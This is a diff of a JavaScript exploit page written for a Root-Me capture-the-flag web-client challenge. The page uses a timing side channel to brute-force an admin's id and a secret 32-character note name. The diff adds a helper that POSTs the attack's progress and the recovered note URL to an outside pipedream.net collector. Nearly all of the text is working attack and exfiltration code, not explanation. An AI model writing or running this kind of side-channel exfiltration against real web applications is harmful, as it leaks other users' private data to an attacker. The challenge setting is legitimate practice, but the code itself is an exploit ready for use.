@@ -1,4 +1,10 @@
 <script>
+function sendRequest(url) {
+    let xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
+    xhr.send(url);
+}
+
 function getKeyOfGreatestElement(dictionary) {
     let maxKey = null;
     let maxValue = -Infinity;
@@ -33,8 +39,11 @@ async function checkId(id) {
 } 
 
 async function attack() {
+    //make sure the bot was on the website
+    sendRequest("test=true");
+
     let noteName = "";
-    let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn";
+    let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn"; //the flag is supposed to be composed of only lowercase letters
     for (let i = 0; i < 10001; i++) {
         //retrieve admin id
         try {
@@ -47,6 +56,7 @@ async function attack() {
         //find final name
         if (adminId != -1) {
             i = 10001;
+            //suposing the flag is 32 characters long
             while (noteName.length < 32) {
                 let times = {};
                 for (let j = 0; j < lowercase_letters.length; j++) {
@@ -76,12 +86,12 @@ async function attack() {
                 }
                 noteName += getKeyOfGreatestElement(times);
                 console.log("name= " + noteName);
+                //partially send the name to keep progress of the attack
+                sendRequest(`note_name=${noteName}`);
             }
     
             //retrieve final name 
-            let xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
-            xhr.send("url=" + encodeURIComponent(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${adminId}/${noteName}`));
+            sendRequest("url=" + encodeURIComponent(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${adminId}/${noteName}`));
         }
         
     }
